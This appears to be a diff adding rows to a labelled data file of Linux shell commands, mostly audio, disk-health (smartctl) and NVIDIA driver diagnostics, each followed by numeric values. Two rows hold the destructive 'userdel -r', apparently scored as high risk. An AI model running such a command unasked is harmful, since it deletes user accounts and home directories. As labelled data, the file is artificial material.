+sudo -u lgate XDG_RUNTIME_DIR=/run/user/1000 pactl set-sink-volume 51 100% && sudo -u lgate XDG_RUNTIME_DIR=/run/user/1000 pactl set-sink-mute 51 0 && sudo -u lgate XDG_RUNTIME_DIR=/run/user/1000 pactl move-sink-input 201 51,0.0,1.0
+grep -H . /proc/asound/card*/pcm*/sub*/status | grep -v 'closed',0.0,1.0
+systemctl --user status pipewire wireplumber pipewire-pulse,0.0,1.0
+id -u lgate,0.0,1.0
+ls -la /run/user/1000/pipewire-0 /run/user/1000/bus,0.0,1.0
+export XDG_RUNTIME_DIR=/run/user/1000; export DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus; wpctl status,0.0,1.0
+amixer -c 0 scontents,0.0,1.0
+export XDG_RUNTIME_DIR=/run/user/1000; wpctl status,0.0,1.0
+amixer -c 0 sget Master; amixer -c 0 sget Speaker; amixer -c 0 sget Headphone,0.0,1.0
+amixer -c 0 sget Front; amixer -c 0 sget 'Auto-Mute Mode',0.0,1.0
+amixer -c 0 scontrols,0.0,1.0
+smartctl -H /dev/sdb,0.0,1.0
+df -h && smartctl -H /dev/sda && smartctl -H /dev/sdc,0.0,1.0
+smartctl -d sat -H /dev/sdc || smartctl -d scsi -H /dev/sdc,0.0,1.0
+smartctl -H /dev/sda && smartctl -H /dev/sdb,0.0,1.0
+df -h && smartctl -H /dev/sdc,0.0,1.0
+smartctl --scan && smartctl -H /dev/sda && smartctl -H /dev/sdb && (smartctl -d sat -H /dev/sdc || smartctl -d scsi -H /dev/sdc || echo 'sdc_unsupported'),0.0,1.0
+"lsblk -o NAME,MODEL,SIZE,FSTYPE,MOUNTPOINT && for dev in /dev/sd[a-b]; do smartctl -H $dev; done && find /var/log /tmp -type f -size +500M -exec ls -lh {} +",0.0,1.0
+smartctl -A /dev/sda && smartctl -A /dev/sdb,0.0,1.0
+smartctl -A /dev/sdc || smartctl -d sat -A /dev/sdc,0.0,1.0
+df -h && lsblk /dev/sdc,0.0,1.0
+sudo smartctl -H /dev/sda && sudo smartctl -H /dev/sdb,0.0,1.0
+"sudo lsblk -d -o NAME,SIZE,TYPE,MODEL && sudo smartctl -H /dev/sda && sudo smartctl -H /dev/sdb",0.0,1.0
+sudo smartctl -l error /dev/sda && df -h,0.0,1.0
+sudo apt update && sudo apt install -y smartmontools,0.0,1.0
+smartctl -a /dev/sda,0.0,1.0
+userdel -r,1.0,1.0
+userdel -r,1.0,100.0
+whoami,0.0,5.0
+lspci -nnk | grep -i vga -A3,0.0,1.0
+dkms status,0.0,1.0
+lsmod | grep nvidia,0.0,1.0
+dpkg -l linux-headers-$(uname -r),0.0,1.0
+apt-cache policy linux-headers-5.15.0-177-generic,0.0,1.0
+sudo modprobe nvidia && lsmod | grep nvidia,0.0,1.0
+nvidia-smi,0.0,1.0
